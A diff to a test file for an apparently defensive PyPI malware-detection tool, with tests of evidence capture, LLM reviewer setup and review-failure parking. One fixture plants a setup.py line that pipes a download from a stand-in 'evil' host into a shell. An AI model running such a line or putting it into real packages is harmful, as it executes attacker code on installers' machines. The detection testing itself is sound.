@@ -45,12 +45,14 @@ def _artifactset(new_files, prior_files):
 
 def test_process_fetched_captures_payload_evidence(tmp_path):
     # A flagged code change must leave the actual payload in releases.evidence (self-contained for a
-    # PyPI takedown report — survives the package being pulled and re-fetch failing).
-    cfg = Config(db_path=tmp_path / "o.sqlite", lock_path=tmp_path / "lk", reviewer_enabled=False)
+    # PyPI takedown report — survives the package being pulled and re-fetch failing). With a reviewer: with none,
+    # nothing is stored and the drain's rebuild stores it (spec B decision 3, tests/test_no_heuristic_alerts.py).
+    cfg = Config(db_path=tmp_path / "o.sqlite", lock_path=tmp_path / "lk")
     conn = store.connect(cfg); store.init_schema(conn)
     art = _artifactset({"setup.py": b"import os\nexec(os.popen('curl evil|sh').read())\n"},
                        {"setup.py": b"import os\n"})
-    orchestrator._process_fetched(cfg, conn, None, orchestrator._load_ruleset(cfg), NewRelease("p", "1.1", 5), art)
+    orchestrator._process_fetched(cfg, conn, reviewer.Reviewer(cfg, backend=object()), orchestrator._load_ruleset(cfg),
+                                  NewRelease("p", "1.1", 5), art, offline=True)   # parked: the model is not called
     ev = store.get_evidence(conn, conn.execute("SELECT id FROM releases WHERE package='p' AND version='1.1'").fetchone()[0])
     assert ev is not None and "exec(os.popen('curl evil|sh').read())" in ev
 
@@ -90,7 +92,7 @@ def test_build_reviewer_anthropic_builds_with_key(monkeypatch):
     assert rvw.backend.primary_model == "claude-sonnet-4-6"
 
 
-def test_llm_down_falls_back_to_heuristic_and_parks_for_review(tmp_path):
+def test_llm_down_parks_for_review_without_an_alert(tmp_path):
     cfg = Config(db_path=tmp_path / "o.sqlite")
     conn = store.connect(cfg); store.init_schema(conn)
     rid = store.record_release(conn, "p", "1.0", 1, False, "0.9", "sdist")
@@ -102,5 +104,4 @@ def test_llm_down_falls_back_to_heuristic_and_parks_for_review(tmp_path):
 
     assert store.get_stage(conn, "p", "1.0") == "pending_review"       # parked; the queue retries it
     assert store.pending_reviews(conn)[0]["pending_reason"] == "review_failed"
-    alert = conn.execute("SELECT classification FROM alerts WHERE release_id=?", (rid,)).fetchone()
-    assert alert["classification"] == "suspicious-heuristic"           # signal not dropped
+    assert conn.execute("SELECT count(*) FROM alerts").fetchone()[0] == 0   # queued, not dropped; no model said so
